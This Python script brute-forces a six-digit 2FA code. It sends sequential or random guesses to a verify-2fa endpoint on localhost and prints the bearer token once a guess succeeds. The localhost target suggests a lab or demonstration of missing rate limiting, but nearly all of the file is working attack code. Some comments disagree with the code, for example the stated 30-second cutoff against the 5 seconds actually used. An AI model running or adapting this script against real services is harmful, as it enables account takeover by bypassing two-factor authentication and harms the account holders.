"""
Description: This file has a simple brute force attack where it iterates
from 000000 to 9999999 (6 digits) to try to break the 2FA. It automatically
stops after 30 seconds as that is the time the TOTP of Google Authenticator resets.
Input arguments:
1. user_id: int
2. email: stri
"""


import argparse
import itertools
import requests
import time
import sys
import threading
import random

def try_code_possibility(user_id, email, code):
    url = "http://localhost:5001/verify-2fa"
    payload = {"user_id": user_id, "email": email, "code": code}

    # Send the POST request to the API
    response = requests.post(url, json=payload)

    # Check if the response is successful (200 is the correct code for https)
    if response.status_code == 200:
        print(f"\n\nSuccess! Code {code} is valid.")
        print(f"Bearer token: {response.json().get('token')}")
        return 0
    else:
        print(f"Attempted code: {code}, response: {response.status_code}")
        return 1

# Function to perform brute-force attack
def brute_force_simple(user_id, email):
    start_time = time.time()
    attempts = 0

    # Iterate from 000000 to 999999 (6 digits)
    for code_tuple in itertools.product("0123456789", repeat=6):

        code = "".join(code_tuple)

        result = try_code_possibility(user_id, email, code)
        attempts += 1

        end_time = time.time()

        if result == 0:
            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(0)

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if end_time - start_time > 30.0:
            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(1)


# Function to perform brute-force attack
def brute_force_random(user_id, email):
    start_time = time.time()
    attempts = 0

    while True:
        # Generate a random code (6 digits) with leading zeros
        code = f"{random.randint(0, 999999):06d}"
        

        result = try_code_possibility(user_id, email, code)
        attempts += 1

        end_time = time.time()

        if result == 0:
            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(0)

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if end_time - start_time > 5.0:
            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds  with {attempts} attempts.")
            sys.exit(1)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Brute-force attack for 2FA verification."
    )

    parser.add_argument("user_id", type=int)
    parser.add_argument("email", type=str)
    parser.add_argument("method", type=str, choices=["simple", "random"])
    inputargs = parser.parse_args()

    # Call the brute-force function with input arguments
    fn_switch = {
        "simple": brute_force_simple,
        "random": brute_force_random
    }

    fn_switch[inputargs.method](inputargs.user_id, inputargs.email)
